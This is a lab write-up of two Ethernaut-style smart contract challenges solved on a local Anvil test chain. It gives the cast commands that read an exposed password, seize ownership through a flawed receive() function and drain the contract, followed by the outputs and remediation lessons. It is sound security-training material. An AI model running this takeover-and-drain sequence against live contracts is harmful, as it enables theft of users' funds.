# Smart Contract Auditing – Web3 Exploitation Labs (Levels 00 & 01)

## Objective
Document the identification, verification, and cryptographic exploitation of vulnerabilities within Ethereum smart contracts inside a private homelab cyber range using Anvil, Forge, and Cast.

## Lab Context
Date/time: 2026-06-25 20:45 EDT
Attacker host: Web3-Audit-Lab (Ubuntu Container)
Target Ledger: Local Anvil Blockchain Network (127.0.0.1:8545)
Targets of Interest: 
- Instance.sol deployment (0x5FbDB2315678afecb367f032d93F642f64180aa3)
- Fallback.sol deployment (0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9)

## Commands Executed

1. Level 00 – Sniffing the public plaintext passcode state variable
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "password()(string)" --rpc-url http://127.0.0.1:8545

2. Level 00 – Executing authentication payload using leaked credential
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "authenticate(string)" "ethernaut_pass_123" --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

3. Level 01 – Seeding the fallback ledger with a minimal contribution
cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "contribute()" --value 1 --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

4. Level 01 – Triggering the naming backdoor via raw value transfer
cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 --value 1 --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

5. Level 01 – Executing owner-protected liquidity drainage payload
cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "withdraw()" --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

## Raw Output (Key Excerpts)

1. Level 00 Passcode Read
"ethernaut_pass_123"

2. Level 01 Administrative Verification Check
cast call 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "owner()(address)" --rpc-url http://127.0.0.1:8545
0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

3. Level 01 Post-Heist Contract Balance
cast balance 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 --rpc-url http://127.0.0.1:8545
0

## Summary of Findings

- Information Disclosure (Level 00): The contract exposed its administrative credential directly on the public state layer: `string public password;`. Marking variables as public auto-generates runtime getters, allowing global unencrypted data access.
- Broken Access Control (Level 01): The unnamed native fallback loop `receive()` contained flawed parameter reassignment logic:
  `require(msg.value > 0 && contributions[msg.sender] > 0); owner = msg.sender;`
  Because attackers can safely manipulation their entry inside the `contributions` mapping for 1 wei, they can force execution through this gate to permanently overwrite contract ownership.

## Lessons Learned

- Blockchains are completely public ledgers. Access visibility modifiers (`public` vs `private`) only restrict compile-time smart contract interfacing—they never encrypt or hide information from off-chain storage analysis.
- Secrets or authentication hashes must never be held raw in state variables. Verification logic should instead rely on cryptographic commitments (e.g., Keccak256) or zero-knowledge validation proofs.
- Implicit state corruption inside fallback loops (`receive()` or `fallback()`) presents a severe security risk. Reassigning administrative privileges should be limited exclusively to named functions protected by explicit access control modifiers like OpenZeppelin's `onlyOwner` design patterns.
